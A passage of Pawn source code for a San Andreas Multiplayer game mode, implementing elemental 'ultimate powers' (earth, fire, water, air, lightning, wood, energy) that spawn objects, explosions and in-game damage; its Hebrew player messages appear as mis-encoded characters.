	KillTimer(sportinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[UseUltimatePower]===========================================================
stock UseUltimatePower(playerid,powertype,powerlevel)
{
	if(!CanUseUltimatePower(playerid)) return 1;
	new Float:p[3], string[M_S], take = GetUPLEnCost(powertype,powerlevel), id = -1;
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	playerinfo[playerid][copypower][0] = powertype;
	playerinfo[playerid][copypower][1] = powerlevel;
	playerinfo[playerid][copypower][2] = 20;
	switch(powertype)
	{
		case 0: switch(powerlevel) // Earth Power
		{
			case 1: // Rock Throw
			{
				new rocks[] = {867,868,879,880,1303,1304,1305}, o;
				id = FindPlayer(playerid,8,2.0);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				o = CreateSObject(rocks[random(sizeof(rocks))],p[0],p[1],p[2],0.0,0.0,0.0);
				if(id != -1) GetPlayerPos(id,p[0],p[1],p[2]);
				else GetXYInFrontOfPlayer(playerid,p[0],p[1],10.0);
				MoveSObject(o,p[0],p[1],p[2],7.5);
				objectinfo[o][oeam] = 12;
				objectinfo[o][odam] = 1;
			}
			case 2: // Underground World
			{
				SetTimerEx("PutInUnderground",2000,0,"i",playerid);
				SetPlayerPos(playerid,p[0],p[1],p[2] - 4.0);
				SetPlayerCameraPos(playerid,p[0],p[1],p[2] + 15.0);
				SetPlayerCameraLookAt(playerid,p[0],p[1],p[2]);
				SetPlayerCheckpoint(playerid,p[0],p[1],p[2],3.0);
				SetFreeze(playerid,1);
				SendClientMessage(playerid,green," .р·ф ю·ч· ьруюф; ьчї Єь юў∙ ыь∙фх ыущ ьчцх° хь·ўхє р· ющ ∙юЄьщъ");
			}
			case 3: // Earth Protection
			{
				new protect[] = {16112,16116,16118,16122}, o;
				GetXYInFrontOfPlayer(playerid,p[0],p[1],12.5);
				o = CreateSObject(protect[random(sizeof(protect))],p[0],p[1],p[2] - 10.0,0.0,0.0,0.0);
				MoveSObject(o,p[0],p[1],p[2],6.0);
				SetTimerEx("ObjectTimerAct",5000,0,"iiiii",o,0,0,1,world_normal);
			}
			case 4: // Earth Jump
			{
				SetPlayerForwardVelocity(playerid,1.5,0.2);
			}
			case 5: // Earth Armour
			{
				new protect[] = {16112,16116,16118,16122}, o;
				for(new i = 0; i < 2; i++)
				{
					GetXYInFrontOfPlayer(playerid,p[0],p[1],!i ? 12.5 : -12.5);
					o = CreateSObject(protect[random(sizeof(protect))],p[0],p[1],p[2] - 10.0,0.0,0.0,0.0);
					MoveSObject(o,p[0],p[1],p[2],8.0);
					SetTimerEx("ObjectTimerAct",10000,0,"iiiii",o,0,0,1,world_normal);
				}
			}
			case 6: // Rock Avalanche
			{
				new rocks[] = {867,868,879,880,1303,1304,1305}, rnd = randomEx(3,7);
				id = FindPlayer(playerid,5,3.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],14.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				playerinfo[playerid][mapolets] = rnd;
				for(new i = 0; i < rnd; i++)
				{
					MoveSObject(playerinfo[playerid][mapolet][i] = CreateSObject(rocks[random(sizeof(rocks))],p[0] + floatrand(-4.0,4.0),p[1] + floatrand(-4.0,4.0),p[2] + floatrand(8.0,15.0),floatrand(0.0,360.0),floatrand(0.0,360.0),floatrand(0.0,360.0)),p[0],p[1],p[2],floatrand(4.0,5.5));
					objectinfo[playerinfo[playerid][mapolet][i]][odam] = 1, objectinfo[playerinfo[playerid][mapolet][i]][oeam] = 6;
				}
			}
			case 7: // Earthquake
			{
				CreateExplosionVW(p[0],p[1],p[2]-5.0,12,0.3,world_normal);
				new d = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid))
				{
					d = 60-floatround(GetDistanceBetweenPlayers(i,playerid));
					if(d > 0 && d <= 60) Damage(i,float(d),playerid);
				}
			}
			case 8: // Objects Collision
			{
				new rocks[] = {867,868,879,880,1303,1304,1305}, o;
				id = FindPlayer(playerid,5,3.0);
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				GetPlayerPos(id,p[0],p[1],p[2]);
				for(new i = 0; i < 4; i++)
				{
					o = CreateSObject(rocks[random(sizeof(rocks))],p[0] + (i == 0 || i == 1 ? (!i ? 22.0 : -22.0) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? 22.0 : -22.0) : 0.0),p[2] + floatrand(0.0,7.0),floatrand(0.0,360.0),floatrand(0.0,360.0),floatrand(0.0,360.0));
					MoveSObject(o,p[0],p[1],p[2],8.0);
					objectinfo[o][odam] = 1, objectinfo[playerinfo[playerid][mapolet][i]][oeam] = 13;
				}
			}
			case 9: // Great Earthquake
			{
				for(new i = 1; i <= 4; i++) SetTimerEx("ExplodeByTimer",i*300,0,"fffiii",p[0]+floatrand(-15.0,15.0),p[1]+floatrand(-15.0,15.0),p[2]-5.0,12,1,world_normal);
				new d = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid))
				{
					d = 60-floatround(GetDistanceBetweenPlayers(i,playerid));
					if(d > 0 && d <= 150) Damage(i,float(d),playerid);
				}
			}
		}
		case 1: switch(powerlevel) // Fire Power
		{
			case 1: // Fire Release
			{
				GetPlayerCameraLine(playerid,p[0],p[1],p[2],14.0);
				CreateExplosionVW(p[0],p[1],p[2],4 + random(2),0.1,world_normal);
			}
			case 2: // Fire Ball
			{
				id = FindPlayer(playerid,7,2.5);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				new o = CreateSObject(1598,p[0],p[1],p[2],0.0,0.0,0.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],6.5);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],7.0);
				SetTimerEx("ObjectTimerAct",3000,0,"iiiii",o,6,0,1,world_normal);
			}
			case 3: // Self Explosion
			{
				SetPlayerHealth(playerid,0.0);
				CreateExplosionVW(p[0],p[1],p[2],7,0.1,world_normal);
			}
			case 4: // Fire Zone
			{
				SendClientMessage(playerid,green," .р·ф ю∙·ю∙ ыЄ· сю·ўЇ· рцх° фр∙, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
				playerinfo[playerid][powerparam] = powerparam_firezone;
			}
			case 5: // Wall of Flames
			{
				new fire[] = {18688,18689,18690,18691}, o;
				for(new i = 0; i < 4; i++)
				{
					CreateExplosionVW(p[0] + (i == 0 || i == 1 ? (!i ? 11.0 : -11.0) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? 11.0 : -11.0) : 0.0),p[2],4,0.1,world_normal);
					AddFire(p[0] + (i == 0 || i == 1 ? (!i ? 11.0 : -11.0) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? 11.0 : -11.0) : 0.0),p[2]);
					o = CreateSObject(fire[random(sizeof(fire))],p[0] + (i == 0 || i == 1 ? (!i ? 11.0 : -11.0) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? 11.0 : -11.0) : 0.0),p[2],0.0,0.0,0.0);
					SetTimerEx("ObjectTimerAct",7000,0,"iiiii",o,4 + random(2),0,1,world_normal);
				}
			}
			case 6: // Grand Fire Ball
			{
				id = FindPlayer(playerid,7,2.5);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				new o = CreateSObject(1598,p[0],p[1],p[2],0.0,0.0,0.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],10.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],7.0);
				SetTimerEx("ObjectTimerAct",3000,0,"iiiii",o,12,0,0,world_normal);
				SetTimerEx("ObjectTimerAct",5000,0,"iiiii",o,7,1,1,world_normal);
			}
			case 7: // Breath of Fire
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],14.0);
				SetTimerEx("ExplodeByTimer",600,0,"fffiii",p[0],p[1],p[2],4,0,world_normal);
				SetTimerEx("ExplodeByTimer",1200,0,"fffiii",p[0]+4.0,p[1],p[2],4,0,world_normal);
				SetTimerEx("ExplodeByTimer",1200,0,"fffiii",p[0]-4.0,p[1],p[2],4,0,world_normal);
				SetTimerEx("ExplodeByTimer",1800,0,"fffiii",p[0],p[1]+4.0,p[2],4,0,world_normal);
				SetTimerEx("ExplodeByTimer",1800,0,"fffiii",p[0],p[1]-4.0,p[2],4,0,world_normal);
			}
			case 8: // Magma Release
			{
				id = FindPlayer(playerid,9,3.5);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				new Float:a, o;
				GetPlayerFacingAngle(playerid,a);
				o = CreateSObject(18985,p[0],p[1],p[2],0.0,0.0,a);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],10.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],3.5);
				SetTimerEx("ObjectTimerAct",2000,0,"iiiii",o,6,0,0,world_normal);
				SetTimerEx("ObjectTimerAct",4000,0,"iiiii",o,7,0,0,world_normal);
				SetTimerEx("ObjectTimerAct",6000,0,"iiiii",o,6,0,1,world_normal);
				objectinfo[o][oeam] = 7;
			}
			case 9: // Fire Streaming
			{
				SendClientMessage(playerid,green," .р·ф ю∙·ю∙ ыЄ· сю·ўЇ· ц°щю· фр∙, ьчї Єь юў∙ фыххЁ· ьц°щюф ью°чў, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
				playerinfo[playerid][powerparam] = powerparam_firestream;
			}
		}
		case 2: switch(powerlevel) // Water Power
		{
			case 1: // Water Shot
			{
				id = FindPlayer(playerid,9,2.0);
				new o = CreateSObject(18739,p[0],p[1],p[2],0.0,0.0,0.0);
				if(id != -1) GetPlayerPos(id,p[0],p[1],p[2]);
				else GetXYInFrontOfPlayer(playerid,p[0],p[1],8.0);
				SetObjectToFaceCords(o,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],8);
				if(id != -1) Damage(id,15.0,playerid);
				objectinfo[o][odam] = 1;
			}
			case 2: // Water Shield
			{
				new o = CreateSObject(18720,p[0],p[1],p[2],0.0,0.0,0.0);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,3.0,p[0],p[1],p[2])) Damage(i,40.0,playerid);
				SetTimerEx("ObjectTimerAct",3000,0,"iiiii",o,0,0,1,world_normal);
			}
			case 3: // Wave
			{
				id = FindPlayer(playerid,8,3.5);
				new Float:a, o;
				GetPlayerFacingAngle(playerid,a);
				o = CreateSObject(9831,p[0],p[1],p[2]-7.0,0.0,0.0,a);
				if(id != -1)
				{
					GetPlayerPos(id,p[0],p[1],p[2]);
					GetXYInFrontOfPlayer(id,p[0],p[1],4.0);
				}
				else GetXYInFrontOfPlayer(playerid,p[0],p[1],12.0);
				MoveSObject(o,p[0],p[1],p[2]-4.0,4.0);
				if(id != -1) Damage(id,30.0,playerid);
				objectinfo[o][odam] = 1;
			}
			case 4: // Freeze
			{
				id = FindPlayer(playerid,5,2.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],5.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				new o = CreateSObject(18720,p[0],p[1],p[2],0.0,0.0,0.0);
				SetFreeze(id,1);
				SetTimerEx("ObjectTimerAct",7000,0,"iiiii",o,0,0,1,world_normal);
				SetTimerEx("UnFreeze",7000,0,"i",id);
			}
			case 5: // Ice Claw
			{
				new o[3];
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.5);
				for(new i = 0; i < 3; i++) o[i] = CreateSObject(18644,!i ? p[0] : (i == 1 ? p[0]+3.5 : p[0]-3.5),p[1],p[2],0.0,0.0,0.0);
				id = FindPlayer(playerid,9,2.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],7.5);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				for(new i = 0; i < 3; i++)
				{
					SetObjectToFaceCords(o[i],p[0],p[1],p[2]);
					MoveSObject(o[i],p[0],p[1],p[2],7.0);
					objectinfo[o[i]][odmg] = 20.0;
					objectinfo[o[i]][odam] = 1;
				}
			}
			case 6: // Fountain Form
			{
				SetPlayerVelocity(playerid,0.0,0.0,3.0);
				playerinfo[playerid][waterobj] = CreateSObject(3515,p[0],p[1],p[2]-5.0,0.0,0.0,0.0);
				MoveSObject(playerinfo[playerid][waterobj],p[0],p[1],p[2],4.0);
				for(new i = 0; i < 3; i++) playerinfo[playerid][waterpos][i] = p[i];
				SendClientMessage(playerid,blue," .р·ф ю∙·ю∙ ыЄ· сю·ўЇ· юц°ў· фющэ, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
				playerinfo[playerid][powerparam] = powerparam_fountain;
			}
			case 7: // Waterfall
			{
				new Float:a;
				GetPlayerFacingAngle(playerid,a);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],3.0);
				playerinfo[playerid][waterobj] = CreateSObject(7916,p[0],p[1],p[2],0.0,0.0,a);
				for(new i = 0; i < 3; i++) playerinfo[playerid][waterpos][i] = p[i];
				SendClientMessage(playerid,blue," .р·ф ю∙·ю∙ ыЄ· сю·ўЇ· юЄ°схь· фющэ, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
				playerinfo[playerid][powerparam] = powerparam_waterfall;
			}
			case 8: // Double Dolphin
			{
				/*new o[2], Float:r[3];
				GetXYInFrontOfPlayer(playerid,p[0],p[1],-4.0);
				o[0] = CreateSObject(1607,p[0]-2.0,p[1],p[2],0.0,0.0,0.0);
				o[1] = CreateSObject(1607,p[0],p[1]+2.0,p[2],0.0,0.0,0.0);
				id = FindPlayer(playerid,9,2.5);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],8.5);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				for(new i = 0; i < 2; i++)
				{
					SetObjectToFaceCords(o[i],p[0],p[1],p[2]);
					AddSObjectPath(o[i],p[0],p[1],p[2],7.0);
					GetSObjectRot(o[i],r[0],r[1],r[2]);
					GetXYInFrontOfPoint(p[0],p[1],r[2],4.0);
					AddSObjectPath(o[i],p[0],p[1],p[2],7.0);
					SetTimerEx("ObjectTimerAct",4000,0,"iiiii",o[i],0,0,1,world_normal);
					objectinfo[o[i]][odmg] = 55.0;
				}*/
			}
			case 9: // Tsunamis
			{
				/*new o[3], Float:a;
				GetPlayerFacingAngle(playerid,a);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],-15.0);
				o[0] = CreateSObject(7916,p[0],p[1],p[2],0.0,0.0,a);
				GetXYInFrontOfPoint(p[0],p[1],90.0,4.5);
				o[1] = CreateSObject(7916,p[0],p[1],p[2],0.0,0.0,a);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],-15.0);
				GetXYInFrontOfPoint(p[0],p[1],270.0,4.5);
				o[2] = CreateSObject(7916,p[0],p[1],p[2],0.0,0.0,a);
				for(new i = 0; i < 3; i++)
				{
					GetSObjectPos(o[i],p[0],p[1],p[2]);
					SetTimerEx("ObjectTimerAct",10000,0,"iiiii",o[i],0,0,1,world_normal);
					objectinfo[o[i]][odmg] = 40.0;
					for(new j = 0; j < 10; j++)
					{
						GetXYInFrontOfPoint(p[0],p[1],a,3.0);
						AddSObjectPath(o[i],p[0],p[1],p[2],5.5);
					}
				}*/
			}
		}
		case 3: switch(powerlevel) // Air Power
		{
			case 1: // Air Jump
			{
				AddPlayerVelocity(playerid,0.0,0.0,10.0);
			}
			case 2: // Air Bomb
			{
				id = FindPlayer(playerid,7,2.5);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],3.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				new o = CreateSObject(18675,p[0],p[1],p[2]-1.2,0.0,0.0,0.0);
				if(id != -1) Damage(id,35.0,playerid);
				SetTimerEx("ObjectTimerAct",850,0,"iiiii",o,0,0,1,world_normal);
			}
			case 3: // Wind Speed
			{
				SetPlayerForwardVelocity(playerid,0.5,0.3);
			}
			case 4: // Air Blast
			{
				id = FindPlayer(playerid,8,2.5);
				if(id != -1) SetPlayerForwardVelocity(id,-0.5,0.3);
			}
			case 5: // Using Cloud
			{
				new Float:a, o;
				GetPlayerFacingAngle(playerid,a);
				o = CreateSObject(18747,p[0],p[1],p[2]-0.2,0.0,0.0,a);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,8.5,p[0],p[1],p[2]) && i != playerid)
				{
					Damage(i,35.0,playerid);
					if(!IsPlayerDead(i)) ApplyAnimation(i,"ped","gas_cwr",4.1,0,1,1,0,0);
				}
				SetTimerEx("ObjectTimerAct",5000,0,"iiiii",o,0,0,1,world_normal);
			}
			case 6: // Going Down
			{
				new Float:h, Float:a;
				GetPlayerHealth(playerid,h);
				GetPlayerArmour(playerid,a);
				SetPlayerHealth(playerid,100000.0);
				SetPlayerVelocity(playerid,0.0,0.0,-3.0);
				SetTimerEx("GoingDown",1500,0,"iffi",playerid,h,a,0);
				SetTimerEx("GoingDown",3000,0,"iffi",playerid,h,a,1);
			}
			case 7: // Strong Wind
			{
				new Float:a, o;
				GetPlayerFacingAngle(playerid,a);
				o = CreateSObject(18674,p[0],p[1],p[2],0.0,0.0,a);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,15.0,p[0],p[1],p[2]) && i != playerid)
				{
					Damage(i,35.0,playerid);
					SetPlayerForwardVelocity(i,-0.7,0.6);
				}
				SetTimerEx("ObjectTimerAct",5000,0,"iiiii",o,0,0,1,world_normal);
			}
			case 8: // Flying
			{
				SetPlayerVelocity(playerid,0.0,0.0,3.0);
				SetCameraBehindPlayer(playerid);
				TestFlyingC(playerid);
				playerinfo[playerid][powerparam] = powerparam_return;
				SendClientMessage(playerid,grey," .р·ф ыЄ· сюЎс ·ЄхЇф, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
			}
			case 9: // Tornado
			{
				playerinfo[playerid][tornado] = 30;
				GetPlayerPos(playerid,playerinfo[playerid][torpos][0],playerinfo[playerid][torpos][1],playerinfo[playerid][torpos][2]);
			}
		}
		case 4: switch(powerlevel) // Lightning Power
		{
			case 1: // Lightning Charge
			{
				playerinfo[playerid][powerparam] = powerparam_lcharge;
				SendClientMessage(playerid,yellow," .р·ф ыЄ· шхЄя с°ўщэ, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
			}
			case 2: // Sword of Lightning
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				new o = CreateSObject(3028,p[0],p[1],p[2],0.0,0.0,0.0);
				id = FindPlayer(playerid,4,3.5);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],4.5);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				SetObjectToFaceCords(o,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],7.5);
				SetTimerEx("ObjectTimerAct",3000,0,"iiiii",o,0,0,1,world_normal);
				if(id != -1)
				{
					if(!playerinfo[id][lredirection]) Damage(id,80.0,playerid);
					SetPlayerTempWeather(id,8,500);
					SetPlayerTempWeather(playerid,8,500);
				}
			}
			case 3: // Lightning Release
			{
				playerinfo[playerid][powerparam] = powerparam_lrelease;
				SendClientMessage(playerid,yellow," .р·ф ыЄ· ю∙ч°° с°ўщэ, ьчї Єь юў∙ фыЁщёф ь°ыс ьфЇёўф");
			}
			case 4: // Lightning Generation
			{
				id = FindPlayer(playerid,7,2.5);
				new o = CreateSObject(18681,p[0],p[1],p[2],0.0,0.0,0.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],5.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],6.5);
				if(id != -1)
				{
					if(!playerinfo[id][lredirection]) objectinfo[o][odmg] = 55.0;
					SetPlayerTempWeather(id,8,2000);
					SetPlayerTempWeather(playerid,8,2000);
				}
				SetTimerEx("ObjectTimerAct",2000,0,"iiiii",o,0,0,1,world_normal);
			}
			case 5: // Lightning Redirection
			{
				playerinfo[playerid][lredirection] = 30;
				SetPlayerTempWeather(playerid,8,1000);
				SendClientMessage(playerid,yellow," .ью∙ъ уўф ∙ьюф юЄы∙щх, ыь ю·ўЇ· с°ўщэ ьр ·∙ЇщЄ Єьщъ");
			}
			case 6: // Lightning Beast
			{
				new beasts[] = {19295,19296,19297,19298};
				id = FindPlayer(playerid,9,3.0);
				new o = CreateSObject(beasts[random(sizeof(beasts))],p[0],p[1],p[2],0.0,0.0,0.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],12.0);
				else GetPlayerPos(id,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],7.5);
				if(!playerinfo[id][lredirection]) objectinfo[o][odmg] = 40.0, objectinfo[o][oeam] = 6;
				objectinfo[o][odam] = 1;
			}
			case 7: // Thunder Burn
			{
				id = FindPlayer(playerid,9,2.5);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],7.5);
				else
				{
					GetPlayerPos(id,p[0],p[1],p[2]);
					Damage(id,200.0,playerid);
					SetPlayerTempWeather(id,8,2000);
					SetPlayerTempWeather(playerid,8,2000);
				}
				CreateExplosionVW(p[0],p[1],p[2],4,0.3,world_normal);
				new o = CreateSObject(18724,p[0]+1.0,p[1]-1.0,p[2],0.0,0.0,0.0), o2 = CreateSObject(18724,p[0]-1.0,p[1]+1.0,p[2],0.0,0.0,0.0);
				SetTimerEx("ObjectTimerAct",2000,0,"iiiii",o,0,0,1,world_normal);
				SetTimerEx("ObjectTimerAct",2000,0,"iiiii",o2,0,0,1,world_normal);
			}
			case 8: // Plasma Ball
			{
				new plasmaballs[] = {19289,19290,19291,19292,19293,19294}, o, Float:p2[3];
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,20.0,p[0],p[1],p[2]) && !playerinfo[i][lredirection])
				{
					o = CreateSObject(plasmaballs[random(sizeof(plasmaballs))],p[0],p[1],p[2],0.0,0.0,0.0);
					GetPlayerPos(i,p2[0],p2[1],p2[2]);
					MoveSObject(o,p2[0],p2[1],p2[2],floatrand(5.0,8.0));
					objectinfo[o][odmg] = 30.0, objectinfo[o][oeam] = 6, objectinfo[o][odam] = 1;
					SetPlayerTempWeather(id,8,5000);
					SetPlayerTempWeather(playerid,8,5000);
				}
			}
			case 9: // Thunderstorm
			{
				playerinfo[playerid][storm] = 30;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,40.0,p[0],p[1],p[2])) SetPlayerTempWeather(i,8,30000);
				GetPlayerPos(playerid,playerinfo[playerid][storpos][0],playerinfo[playerid][storpos][1],playerinfo[playerid][storpos][2]);
			}
		}
		case 5: switch(powerlevel) // Wood Power
		{
			case 1: // Wood Hand
			{
				new trees[3] = {629,674,684}, o;
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				id = FindPlayer(playerid,3,9.0);
				if(id == -1)
				{
					o = CreateSObject(trees[random(sizeof(trees))],p[0],p[1],p[2],0.0,0.0,0.0);
					GetXYInFrontOfPlayer(playerid,p[0],p[1],5.0);
				}
				else
				{
					if(GetDistanceBetweenPlayers(playerid,id) > 5.0) trees = {620,659,686};
					o = CreateSObject(trees[random(sizeof(trees))],p[0],p[1],p[2],0.0,0.0,0.0);
					GetPlayerPos(id,p[0],p[1],p[2]);
				}
				SetObjectToFaceCords(o,p[0],p[1],p[2]);
				MoveSObject(o,p[0],p[1],p[2],floatrand(3.0,5.0));
				objectinfo[o][odmg] = floatrand(40.0,65.0), objectinfo[o][odam] = 1;
			}
			case 2: // Cactus Attack
			{
				new cac[] = {650,651,653,753,754,755,756,757};
				id = FindPlayer(playerid,3,8.0);
				if(id == -1) GetXYInFrontOfPlayer(playerid,p[0],p[1],5.0);
				else
				{
					GetPlayerPos(id,p[0],p[1],p[2]);
					SetPlayerVelocity(id,0.0,0.0,2.0);
				}
				new o = CreateSObject(cac[random(sizeof(cac))],p[0],p[1],p[2]-4.0,0.0,0.0,0.0);
				MoveSObject(o,p[0],p[1],p[2],floatrand(3.0,5.0));
				objectinfo[o][odmg] = floatrand(40.0,80.0);
				SetTimerEx("ObjectTimerAct",1200,0,"iiiii",o,0,0,1,world_normal);
			}
			case 3: // Healing Tree
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
				playerinfo[playerid][waterobj] = CreateSObject(19076,p[0],p[1],p[2],0.0,0.0,0.0);
				for(new i = 0; i < 3; i++) playerinfo[playerid][waterpos][i] = p[i];
				SetTimerEx("HealingTree",1000,0,"ii",playerid,1);
			}
			case 4: // Wood Clone
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],3.5);
				new Float:a, ps = 0, pl[MAX_PLAYERS], Float:x[3];
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerInRangeOfPoint(i,17.0,p[0],p[1],p[2])) pl[ps++] = i;
				GetPlayerFacingAngle(playerid,a);
				playerinfo[playerid][waterobj] = CreateSObject(18846,p[0],p[1],p[2]-5.0,0.0,0.0,a);
				AddSObjectPath(playerinfo[playerid][waterobj],p[0],p[1],p[2],4.0);
				format(objectinfo[playerinfo[playerid][waterobj]][pathevent],32,"WoodClone");
				objectinfo[playerinfo[playerid][waterobj]][patheventparam] = playerid;
				for(new i = 0; i < ps; i++)
				{
					GetPlayerPos(pl[i],x[0],x[1],x[2]);
					AddSObjectPath(playerinfo[playerid][waterobj],x[0],x[1],x[2],6.0);
				}
				AddSObjectPath(playerinfo[playerid][waterobj],p[0],p[1],p[2]-5.0,3.0);
			}
			case 5: // Great Forest
			{
				new forest[] = {615,619,620,621,634,645,652,654,659,664,669,670,672,673,674,686,700}, num = randomEx(8,26), tree[25], trees = 0;
				tree[trees++] = CreateSObject(783,p[0],p[1],p[2]-10.0,0.0,0.0,0.0);
				for(new i = 0; i < num; i++) tree[trees++] = CreateSObject(forest[random(sizeof(forest))],floatrand(p[0]-40.0,p[0]+40.0),floatrand(p[1]-40.0,p[1]+40.0),p[2]-5.0,0.0,0.0,floatrand(0.0,360.0));
				for(new i = 0; i < trees; i++)
				{
					MoveSObject(tree[i],p[0]+floatrand(-7.0,7.0),p[1]+floatrand(-7.0,7.0),p[2]+floatrand(-1.5,1.5),floatrand(4.5,7.5));
					objectinfo[tree[i]][odmg] = 45.0;
					objectinfo[tree[i]][oeam] = !random(3) ? 6 : 12;
					objectinfo[tree[i]][odam] = 1;
				}
			}
		}
		case 6: switch(powerlevel) // Energy Power
		{
			case 1: // Scanning
			{
				id = FindPlayer(playerid,12,2.5);
				if(id == -1) id = playerid;
				format(string,sizeof(string)," %d/%d :%s ·хЎрх· ё°щў· рЁ°тщф Єь",playerinfo[id][energy],levels[playerinfo[id][level]][EnergyLimit],GetName(id));
				SendClientMessage(playerid,purple,string);
			}
			case 2: // Energy Release
			{
				id = FindPlayer(playerid,4,3.0);
				if(id == -1) SendClientMessage(playerid,purple," .ьр ЁюЎр ∙чўя");
				else
				{
					playerinfo[playerid][powerparam] = powerparam_energy, playerinfo[playerid][energyrelease] = id;
					format(string,sizeof(string)," .∙юх° Єь ю°чў ў°хс сщЁщыэ ,%s ф·чь· ьфЄсщ° рЁ°тщф рь",GetName(id));
					SendClientMessage(playerid,purple,string);
					format(string,sizeof(string)," .ф·чщь ьфЄсщ° рьщъ рЁ°тщф! ф·°чў ююЁх ыущ ьсшь р· ффЄс°ф %s",GetName(playerid));
					SendClientMessage(id,purple,string);
				}
			}
			case 3: // Energy Pump
			{
				id = FindPlayer(playerid,4,3.0);
				if(id == -1) SendClientMessage(playerid,purple," .ьр ЁюЎр ∙чўя");
				else
				{
					playerinfo[playerid][powerparam] = powerparam_energy, playerinfo[playerid][energypump] = id;
					format(string,sizeof(string)," .∙юх° Єь ю°чў ў°хс сщЁщыэ ,%s-ф·чь· ь∙рхс рЁ°тщф ю",GetName(id));
					SendClientMessage(playerid,purple,string);
					format(string,sizeof(string)," .ф·чщь ь∙рхс ююъ рЁ°тщф! ф·°чў ююЁх ыущ ьсшь р· ф∙рщсф %s",GetName(playerid));
					SendClientMessage(id,purple,string);
				}
			}
			case 4: // Energy Pump Straw
			{
				id = FindPlayer(playerid,8,2.5);
				if(id == -1) SendClientMessage(playerid,purple," .ьр ЁюЎр ∙чўя");
				else
				{
					playerinfo[playerid][powerparam] = powerparam_energy, playerinfo[playerid][energystraw] = id;
					format(string,sizeof(string)," .фю°чў сщЁщыэ щыхь ьф∙р° р°хъ рсь Єу тсхь юёхщщэ ,%s-ф·чь· ь∙рхс рЁ°тщф ю",GetName(id));
					SendClientMessage(playerid,purple,string);
					format(string,sizeof(string)," .ф·чщь ь∙рхс ююъ рЁ°тщф ю°чхў! ф·°чў ююЁх юрху ыущ ьсшь р· ф∙рщсф %s",GetName(playerid));
					SendClientMessage(id,purple,string);
				}
			}
			case 5: // The 128
			{
				id = FindPlayer(playerid,3,3.0);
				if(id == -1) SendClientMessage(playerid,purple," .ьр ЁюЎр ∙чўя");
				else
				{
					playerinfo[playerid][powerparam] = powerparam_energy, playerinfo[playerid][energypump] = id;
					new the = 128;
					if(playerinfo[id][energy] < 128) the = playerinfo[id][energy];
					TakeEnergy(id,the);
				}
			}
		}
		case 7: switch(powerlevel) // Eye Techniques
		{
